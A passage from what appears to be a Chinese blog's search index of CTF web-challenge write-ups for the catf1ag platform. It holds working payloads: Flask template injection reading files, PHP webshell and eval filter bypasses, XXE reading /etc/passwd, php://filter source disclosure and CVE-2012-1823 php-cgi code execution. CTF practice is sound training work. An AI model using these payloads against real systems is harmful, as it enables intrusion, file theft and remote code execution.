class=\"string\">&#x27;flag.png&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>手动走一下</p>\n<p>ssssddssaassddddwwwwddwwddddddwwddddddssddwwddddddddssssaawwaassaassaassddssaassaawwwwwwaaaaaaaassaassddddwwddssddssssaassddssssaaaaaawwddwwaawwwwaassssssssssssddddssddssddddddddwwaaaaaawwwwddssddwwwwwwwwddssddssssssssddddss</p>\n<p>md5一下就是flag</p>\n","categories":["ctf比赛"],"tags":["一次题目较难的比赛t题目中的的比赛"]},{"title":"catf1ag","url":"/2022/05/08/catf1ag/","content":"<p>是拥有很简单题目的平台</p>\n<span id=\"more\"></span>\n\n<h4 id=\"web签到题\"><a href=\"#web签到题\" class=\"headerlink\" title=\"web签到题\"></a>web签到题</h4><!--zygsctf{47jqwfshb0na12y3g9uomlktvixed8}-->\n\n<h4 id=\"where-is-flags\"><a href=\"#where-is-flags\" class=\"headerlink\" title=\"where is flags?\"></a>where is flags?</h4><p>f12源代码有flagb，响应头有flaga，两者拼接，base64即可获得flag。</p>\n<h4 id=\"《我的女友是机器人》\"><a href=\"#《我的女友是机器人》\" class=\"headerlink\" title=\"《我的女友是机器人》\"></a>《我的女友是机器人》</h4><p>御剑扫到robots.txt,直接访问disallow即可获得flag。</p>\n<h4 id=\"文件包含\"><a href=\"#文件包含\" class=\"headerlink\" title=\"文件包含\"></a>文件包含</h4><p>f12源码提示?file=get_flag，访问可得flag。</p>\n<h4 id=\"easy-serialize\"><a href=\"#easy-serialize\" class=\"headerlink\" title=\"easy_serialize\"></a>easy_serialize</h4><p>输出一下比较的序列化内容，str=输出的内容，即</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?str=O:<span class=\"number\">13</span>:<span class=\"string\">&quot;flag_in_there&quot;</span>:<span class=\"number\">2</span>:&#123;s:<span class=\"number\">4</span>:<span class=\"string\">&quot;name&quot;</span>;s:<span class=\"number\">5</span>:<span class=\"string\">&quot;vfree&quot;</span>;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;age&quot;</span>;s:<span class=\"number\">2</span>:<span class=\"string\">&quot;19&quot;</span>;&#125;  可以获得flag。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"strcmp\"><a href=\"#strcmp\" class=\"headerlink\" title=\"strcmp\"></a>strcmp</h4><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&#x27;flag.php&#x27;</span>);</span><br><span class=\"line\">show_source(<span class=\"string\">&quot;index.php&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$str</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;str&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$init_str</span> = <span class=\"string\">&quot;get_flag&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$str</span>!=<span class=\"variable\">$init_str</span>)&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(strcmp(<span class=\"variable\">$init_str</span>,<span class=\"variable\">$str</span>)==<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">  &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;no&quot;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;nonono&quot;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>strcmp若是数组与字符串比较，会返回null==0.</p>\n<p>/?str[]=get_flag 可以获得flag</p>\n<h4 id=\"get-file\"><a href=\"#get-file\" class=\"headerlink\" title=\"get_file\"></a>get_file</h4><p>源码提示file所以构造/?file=flag</p>\n<h4 id=\"easy-flask\"><a href=\"#easy-flask\" class=\"headerlink\" title=\"easy_flask\"></a>easy_flask</h4><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">?cmd=&#123;&#123;config&#125;&#125; 可以得到以下内容，但flag不对。</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;SECRET_KEY&#x27;</span>: <span class=\"string\">&#x27;zygsctf&#123;3s41zeynr9ixf8mko62apdghtv0uc75qjlbw&#125;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">?cmd=&#123;&#123;<span class=\"string\">&quot;&quot;</span>. _ _class _ _. _ _mro _ _&#125;&#125;     (&lt;<span class=\"class\"><span class=\"keyword\">class</span> &#x27;<span class=\"title\">str</span>&#x27;&gt;, &lt;<span class=\"title\">class</span> &#x27;<span class=\"title\">object</span>&#x27;&gt;)</span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\">[]. <span class=\"title\">_</span> <span class=\"title\">_class</span> <span class=\"title\">_</span> <span class=\"title\">_</span>. <span class=\"title\">_</span> <span class=\"title\">_mro</span> <span class=\"title\">_</span> <span class=\"title\">_</span>[1]. <span class=\"title\">_</span> <span class=\"title\">_subclasses</span> <span class=\"title\">_</span> <span class=\"title\">_</span>()    //返回各种类，没有<span class=\"title\">file</span>类   但是有<span class=\"title\">popen</span>类，其可以读取文件，执行各种命令</span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\">  /?<span class=\"title\">cmd</span>=</span>&#123;&#123;[]. _ _class _ _. _ _mro _ _[<span class=\"number\">1</span>]. _ _subclasses _ _[<span class=\"number\">288</span>]. _ _init__.__globals _ ___        返回一个字典，找到键值为<span class=\"string\">&#x27; _ _builtins _ _&#x27;</span>，值为<span class=\"string\">&quot;open&quot;</span>，其可以读取文件</span><br><span class=\"line\"></span><br><span class=\"line\">最终payload：/?cmd=&#123;&#123;[]. _ _class__. _ _mro _ _[<span class=\"number\">1</span>]. _ _subclasses _ _[<span class=\"number\">288</span>]. _ _init _ _. _ _globals _ _ [<span class=\"string\">&#x27; _ _builtins _ _&#x27;</span> ] [<span class=\"string\">&quot;open&quot;</span> ](<span class=\"string\">&quot;/app/flag&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>推荐网址：<a href=\"https://www.freebuf.com/articles/network/247503.html\">浅谈flask与ctf那些事 - FreeBuf网络安全行业门户</a></p>\n<h4 id=\"我幽默吗？\"><a href=\"#我幽默吗？\" class=\"headerlink\" title=\"我幽默吗？\"></a>我幽默吗？</h4><p>f12提示是一个棋盘，#1上面一行代表顺序，下面一行代表行号列好，可以解的source。</p>\n<h5 id=\"链接里面详细说了这个题涉及到的知识点，看懂后就可以构造a和b，现在的问题是怎么进到else语句。可以看到if里面-count-1，这个语句正常执行返回结果肯定是1，要是想进else那就肯定不能让它正常执行，这里可以用php数组的溢出，来使得-count-1赋值失败。php数组的临界值是9223372036854775807，所以结合代码我们只需要给c传9223372036854775806就可以进入else语句，再结合参考链接里面的我们可以依次post传以下payload拿flag。\"><a href=\"#链接里面详细说了这个题涉及到的知识点，看懂后就可以构造a和b，现在的问题是怎么进到else语句。可以看到if里面-count-1，这个语句正常执行返回结果肯定是1，要是想进else那就肯定不能让它正常执行，这里可以用php数组的溢出，来使得-count-1赋值失败。php数组的临界值是9223372036854775807，所以结合代码我们只需要给c传9223372036854775806就可以进入else语句，再结合参考链接里面的我们可以依次post传以下payload拿flag。\" class=\"headerlink\" title=\"链接里面详细说了这个题涉及到的知识点，看懂后就可以构造a和b，现在的问题是怎么进到else语句。可以看到if里面$count[]=1，这个语句正常执行返回结果肯定是1，要是想进else那就肯定不能让它正常执行，这里可以用php数组的溢出，来使得$count[]=1赋值失败。php数组的临界值是9223372036854775807，所以结合代码我们只需要给c传9223372036854775806就可以进入else语句，再结合参考链接里面的我们可以依次post传以下payload拿flag。\"></a>链接里面详细说了这个题涉及到的知识点，看懂后就可以构造a和b，现在的问题是怎么进到else语句。可以看到if里面$count[]=1，这个语句正常执行返回结果肯定是1，要是想进else那就肯定不能让它正常执行，这里可以用php数组的溢出，来使得$count[]=1赋值失败。php数组的临界值是9223372036854775807，所以结合代码我们只需要给c传9223372036854775806就可以进入else语句，再结合参考链接里面的我们可以依次post传以下payload拿flag。</h5><h5 id=\"php中-可以用用DirectoryIterator获取指定目录的文件或者目录\"><a href=\"#php中-可以用用DirectoryIterator获取指定目录的文件或者目录\" class=\"headerlink\" title=\"php中,可以用用DirectoryIterator获取指定目录的文件或者目录\"></a>php中,可以用用DirectoryIterator获取指定目录的文件或者目录</h5><h5 id=\"php使用glob-遍历文件夹\"><a href=\"#php使用glob-遍历文件夹\" class=\"headerlink\" title=\"php使用glob://遍历文件夹\"></a>php使用glob://遍历文件夹</h5><p>payload：a=DirectoryIterator&amp;b=glob://flag[a-z0-9]*.php&amp;c=9223372036854775806</p>\n<p>得到flag56ea8b83122449e814e0fd7bfb5f220a.php</p>\n<p>使用伪协议得到flag payload：a=SplFileObject&amp;b=php://filter/convert.base64-encode/resource=flag56ea8b83122449e814e0fd7bfb5f220a.php&amp;c=9223372036854775806</p>\n<p>学习网址：<a href=\"https://blog.csdn.net/qq_38154820/article/details/121112935\">(3条消息) 记一道2021浙江省赛的Web题_合天网安实验室的博客-CSDN博客</a></p>\n<h4 id=\"什么-有后门\"><a href=\"#什么-有后门\" class=\"headerlink\" title=\"什么?有后门\"></a>什么?有后门</h4><p>河马查杀发现一句话木马：$pass = substr_replace(‘zysdasd’,’gsctf’,2);</p>\n<p>$pass=zygsctf</p>\n<h4 id=\"int\"><a href=\"#int\" class=\"headerlink\" title=\"int\"></a>int</h4><p>payload：?num=666a</p>\n<h4 id=\"secret-key\"><a href=\"#secret-key\" class=\"headerlink\" title=\"secret_key\"></a>secret_key</h4><p>payload：?cmd=  模板注入</p>\n<h4 id=\"easy-js\"><a href=\"#easy-js\" class=\"headerlink\" title=\"easy_js\"></a>easy_js</h4><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">show_source(<span class=\"string\">&#x27;index.php&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&#x27;flag.php&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable\">$key</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$decode</span> = json_decode(<span class=\"variable\">$key</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$decode</span>-&gt;flag == <span class=\"variable\">$flag</span>)&#123;</span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;404 not found&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>var_dump(0 == “a”);  为true</p>\n<p>patload：?key={“flag”:0}</p>\n<h4 id=\"等于False\"><a href=\"#等于False\" class=\"headerlink\" title=\"等于False\"></a>等于False</h4><p>payload：?num[]=1</p>\n<h4 id=\"命令执行\"><a href=\"#命令执行\" class=\"headerlink\" title=\"命令执行\"></a>命令执行</h4><p>payload:?cmd=”ls”</p>\n<p>payload:?cmd=cat get_flag</p>\n<h4 id=\"webshell\"><a href=\"#webshell\" class=\"headerlink\" title=\"webshell\"></a>webshell</h4><p>御剑扫到robots.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">User-Agent: *</span><br><span class=\"line\">Disallow: webshe11.php</span><br></pre></td></tr></table></figure>\n\n<p>源代码base64解码为hacker，蚁剑连不上，那就用get传参</p>\n<p>/webshe11.php/?hacker=system(“ls ../../../../flag”);</p>\n<p>bin dev etc flag home lib media mnt proc root run sbin srv sys tmp usr var</p>\n<p>/webshe11.php/?hacker=system(“cat ../../../../flag”); 可以获得flag</p>\n<h4 id=\"无字符webshell\"><a href=\"#无字符webshell\" class=\"headerlink\" title=\"无字符webshell\"></a>无字符webshell</h4><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$_</span>=<span class=\"string\">&quot;`&#123;&#123;&#123;&quot;</span>^<span class=\"string\">&quot;?&lt;&gt;/&quot;</span>; <span class=\"comment\">//_GET</span></span><br><span class=\"line\">$&#123;<span class=\"variable\">$_</span>&#125;[_]($&#123;<span class=\"variable\">$_</span>&#125;[__]); <span class=\"comment\">//$_GET[_]($_GET[__])</span></span><br><span class=\"line\">&amp;_=system()</span><br><span class=\"line\">&amp;__=ls<span class=\"comment\">//执行函数 eval(&quot;system(&#x27;ls&#x27;)&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//payload</span></span><br><span class=\"line\"><span class=\"variable\">$_</span>=<span class=\"string\">&quot;`&#123;&#123;&#123;&quot;</span>^<span class=\"string\">&quot;?&lt;&gt;/&quot;</span>;$&#123;<span class=\"variable\">$_</span>&#125;[_]($&#123;<span class=\"variable\">$_</span>&#125;[__]);&amp;_=system&amp;__=ls</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>Dockerfile docker-compose.yml flag.txt index.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/?cmd=$\\_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$\\_&#125;\\[\\_\\]($&#123;$\\_&#125;\\[\\_\\_\\]);&amp;_=system&amp;__=cat flag.txt</span><br></pre></td></tr></table></figure>\n\n<p>得到flag</p>\n<h4 id=\"命令执行之我是谁\"><a href=\"#命令执行之我是谁\" class=\"headerlink\" title=\"命令执行之我是谁\"></a>命令执行之我是谁</h4><p>?cmd=passthru(“ls”);     flag index.php</p>\n<p>?cmd=passthru(“ca’’t fla’’g”);    得到flag</p>\n<h4 id=\"命令执行之我在哪\"><a href=\"#命令执行之我在哪\" class=\"headerlink\" title=\"命令执行之我在哪\"></a>命令执行之我在哪</h4><p>?cmd=passthru(“ls”); </p>\n<p>flag.php index.php  </p>\n<p>payload:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">&#x27;/php:\\/\\/|data:\\/\\/|phar:\\/\\/|phpinfo()|info|flag|rm|\\/|echo|\\.|\\*|\\?/i&#x27;</span>,<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class=\"line\">        @<span class=\"keyword\">eval</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]);</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;danger_string&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;你啥也不输入，给你个假的flag:flag&#123;error_flag&#125;&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight ini\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">c</span>=eval(<span class=\"variable\">$_GET</span>[<span class=\"number\">1</span>])<span class=\"comment\">;&amp;1=system(&#x27;nl flag.php&#x27;);</span></span><br><span class=\"line\"><span class=\"attr\">c</span>=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))))<span class=\"comment\">;</span></span><br><span class=\"line\"><span class=\"attr\">c</span>=show_source(next(array_reverse(scandir(pos(localeconv())))))<span class=\"comment\">;</span></span><br><span class=\"line\"><span class=\"attr\">c</span>=echo(`nl%<span class=\"number\">09</span>fl[abc]*`)<span class=\"comment\">;</span></span><br><span class=\"line\"><span class=\"attr\">c</span>=<span class=\"string\">&quot;x73x79x73x74x65x6d&quot;</span>(<span class=\"string\">&quot;nl%09fl[a]*&quot;</span>)<span class=\"comment\">;等价于system()</span></span><br><span class=\"line\"><span class=\"attr\">c</span>=echo`strings%<span class=\"number\">09</span>f*`<span class=\"comment\">;</span></span><br><span class=\"line\"><span class=\"attr\">c</span>=echo`strings<span class=\"variable\">$IFS</span><span class=\"variable\">$9f</span>*`必须加转义字符</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"还有其他姿势：\"><a href=\"#还有其他姿势：\" class=\"headerlink\" title=\"还有其他姿势：\"></a>还有其他姿势：</h5><h5 id=\"首先print-r-scandir-dirname-FILE-查看当前目录下文件\"><a href=\"#首先print-r-scandir-dirname-FILE-查看当前目录下文件\" class=\"headerlink\" title=\"首先print_r(scandir(dirname(__FILE__)));查看当前目录下文件\"></a>首先<code>print_r(scandir(dirname(__FILE__)));</code>查看当前目录下文件</h5><h5 id=\"然后找到flag-php\"><a href=\"#然后找到flag-php\" class=\"headerlink\" title=\"然后找到flag.php\"></a>然后找到<code>flag.php</code></h5><h5 id=\"print-r-next-array-reverse-scandir-dirname-FILE\"><a href=\"#print-r-next-array-reverse-scandir-dirname-FILE\" class=\"headerlink\" title=\"print_r(next(array_reverse(scandir(dirname(__FILE__)))));\"></a><code>print_r(next(array_reverse(scandir(dirname(__FILE__)))));</code></h5><h5 id=\"之后高亮显示即可\"><a href=\"#之后高亮显示即可\" class=\"headerlink\" title=\"之后高亮显示即可\"></a>之后高亮显示即可</h5><h5 id=\"c-highlight-file-next-array-reverse-scandir-dirname-FILE\"><a href=\"#c-highlight-file-next-array-reverse-scandir-dirname-FILE\" class=\"headerlink\" title=\"c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));\"></a><code>c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));</code></h5><h5 id=\"payload：-cmd-highlight-file-next-array-reverse-scandir-dirname-FILE-可以获得flag。\"><a href=\"#payload：-cmd-highlight-file-next-array-reverse-scandir-dirname-FILE-可以获得flag。\" class=\"headerlink\" title=\"payload：?cmd=highlight_file(next(array_reverse(scandir(dirname(FILE))))); 可以获得flag。\"></a>payload：?cmd=highlight_file(next(array_reverse(scandir(dirname(<strong>FILE</strong>))))); 可以获得flag。</h5><p>学习网址：<a href=\"https://www.cnblogs.com/murkuo/p/15159566.html\">CTF 命令执行 - MuRKuo - 博客园 (cnblogs.com)</a></p>\n<h4 id=\"小矛盾\"><a href=\"#小矛盾\" class=\"headerlink\" title=\"小矛盾\"></a>小矛盾</h4><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&#x27;xxxxxx.php&#x27;</span>);</span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">show_source(<span class=\"string\">&#x27;index.php&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable\">$init_num</span> = <span class=\"string\">&#x27;999999999999&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$user_num</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;num&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$user_num</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$user_num</span> != <span class=\"variable\">$init_num</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(strlen(<span class=\"variable\">$user_num</span>) &lt; strlen(<span class=\"variable\">$init_num</span>))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"variable\">$user_num</span> &gt; <span class=\"variable\">$init_num</span>)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;你输入的数字小于初始值~&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;不能大于初始值~&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;不能相等~&#x27;</span>;\t</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;请输入内容~&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure>\n\n<p>payload：/?num=1000e100  </p>\n<p>然后再响应头发现flag</p>\n<h4 id=\"ENV\"><a href=\"#ENV\" class=\"headerlink\" title=\"ENV\"></a>ENV</h4><h5 id=\"打开题目给了个-cat-但是说不是命令执行，并且没有flag文件结合题目env，想到在PHP中的-ENV是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP-程序的任何地方直接访问它。所以就直接var-dump打印一下环境变量看看行不行。传入\"><a href=\"#打开题目给了个-cat-但是说不是命令执行，并且没有flag文件结合题目env，想到在PHP中的-ENV是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP-程序的任何地方直接访问它。所以就直接var-dump打印一下环境变量看看行不行。传入\" class=\"headerlink\" title=\"打开题目给了个/?cat=但是说不是命令执行，并且没有flag文件结合题目env，想到在PHP中的$_ENV是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它。所以就直接var_dump打印一下环境变量看看行不行。传入\"></a>打开题目给了个/?cat=但是说不是命令执行，并且没有flag文件结合题目env，想到在PHP中的$_ENV是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它。所以就直接var_dump打印一下环境变量看看行不行。传入</h5><p>payload：?cat=print_r($_ENV);</p>\n<h4 id=\"Cross-Site-Scripting\"><a href=\"#Cross-Site-Scripting\" class=\"headerlink\" title=\"Cross Site Scripting\"></a>Cross Site Scripting</h4><p>跨站脚本攻击</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?catf1ag=&lt;a href=&quot;javascript:alert(1)&quot;&gt;hi&lt;/a&gt;  //成功弹出</span><br></pre></td></tr></table></figure>\n\n<p>打开源代码赋值到命令行执行可以获得Y2F0ZjFhZ3tsdXdqZXRzaG4xdjRxcjJtNnlnNzUwcDk4Y2J6b3hraTNhZmR9</p>\n<p>解码即可获得flag</p>\n<h4 id=\"xxelab1\"><a href=\"#xxelab1\" class=\"headerlink\" title=\"xxelab1\"></a>xxelab1</h4><p>构造以下可以获得目录信息：</p>\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\n<!DOCTYPE test[\n    <!ENTITY file SYSTEM \"file:///etc/passwd\">\n<p>]&gt;<root><name>admin</name><tel>11111111111</tel><email><br>&file;</email><password>123</password></root></p>\n<p>构造以下可以获得flag</p>\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\n<!DOCTYPE test[\n    <!ENTITY file SYSTEM \"file:///flag\">\n<p>]&gt;<root><name>admin</name><tel>11111111111</tel><email><br>&file;</email><password>123</password></root></p>\n<p>学习网址：<a href=\"https://www.cnblogs.com/zzjdbk/p/12981595.html\">xxe-lab学习 - My_Dreams - 博客园 (cnblogs.com)</a></p>\n<h4 id=\"xxelab2\"><a href=\"#xxelab2\" class=\"headerlink\" title=\"xxelab2\"></a>xxelab2</h4><p>提示flag在flag.php，使用input协议读取即”php://filter/convert.base64-encode/resource=flag.php”</p>\n<p>构造如下可以获得flag</p>\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\n<!DOCTYPE test[\n    <!ENTITY file SYSTEM \"php://filter/convert.base64-encode/resource=flag.php\">\n<p>]&gt;<root><name>admin</name><tel>11111111111</tel><email>&file;</email><password>123</password></root></p>\n<h4 id=\"变量覆盖-extract\"><a href=\"#变量覆盖-extract\" class=\"headerlink\" title=\"变量覆盖_extract\"></a>变量覆盖_extract</h4><h5 id=\"本题考察extract的变量覆盖漏洞，extract-该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。所以本题直接传入，init-str-6即可拿到flag\"><a href=\"#本题考察extract的变量覆盖漏洞，extract-该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。所以本题直接传入，init-str-6即可拿到flag\" class=\"headerlink\" title=\"本题考察extract的变量覆盖漏洞，extract()该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。所以本题直接传入，init_str=6即可拿到flag\"></a>本题考察extract的变量覆盖漏洞，extract()该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。所以本题直接传入，init_str=6即可拿到flag</h5><p>payload:/?init_str=6</p>\n<h4 id=\"啥都没了\"><a href=\"#啥都没了\" class=\"headerlink\" title=\"啥都没了\"></a>啥都没了</h4><p>.swp是程序异常产生的</p>\n<p>备份问价扫描扫到</p>\n<p>.index.php.swp    12288</p>\n<p>下载下来在文件末尾找到flag</p>\n<h4 id=\"random-flag\"><a href=\"#random-flag\" class=\"headerlink\" title=\"random_flag\"></a>random_flag</h4><p>?file=php://filter/convert.base64-encode/resource=index.php  得到源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;file=&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$file</span> = @file(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$file</span>))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$rand_num</span> = rand(<span class=\"number\">0</span>,count(<span class=\"variable\">$file</span>)); <span class=\"comment\">//flag in catf1ag.php 只能是0或1</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"variable\">$file</span>[<span class=\"variable\">$rand_num</span>];  <span class=\"comment\">//随机数为0时才输出文件</span></span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;no_flag or not_file&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>?file=php://filter/convert.base64-encode/resource=catf1ag.php  base64解码即可找到flag。</p>\n<h4 id=\"CGI\"><a href=\"#CGI\" class=\"headerlink\" title=\"CGI\"></a>CGI</h4><p>CVE-2012-1823 php-cgi远程代码执行并查到了该漏洞利用的方式，这里写一下cgi相关的参数：</p>\n<p>-c 指定php.ini文件的位置</p>\n<p>-n 不要加载php.ini文件</p>\n<p>-d 指定配置项</p>\n<p>-b 启动fastcgi进程</p>\n<p>-s 显示文件源码</p>\n<p>-T 执行指定次该文件</p>\n<p>-h 和 -? 显示帮助</p>\n<p> 首先就用-s参数看源码（就在url后面加?-s就行<br>这里通过-d指定auto_prepend_file来制造任意文件包含漏洞，那这里的思路就是我们就可以用php://input指定执行自己的php文件。这里需要注意要想实现文件包含我们要将我们应该将allow_url_include设置为on,这里payload分两部分：</p>\n<p>1.url传参</p>\n<p>?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input<br>2.post传参</p>\n<?php echo shell_exec('ls');?><p>发现flag</p>\n<?php echo shell_exec('cat /flag');?><p>即可得到flag</p>\n<h4 id=\"easy-base64\"><a href=\"#easy-base64\" class=\"headerlink\" title=\"easy_base64\"></a>easy_base64</h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#-*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\">#使用说明：python for_base64_decode.py &quot;需要多次解码的内容&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">base64decoding</span>(<span class=\"params\">src</span>):</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            src = base64.b64decode(src)</span><br><span class=\"line\">            num 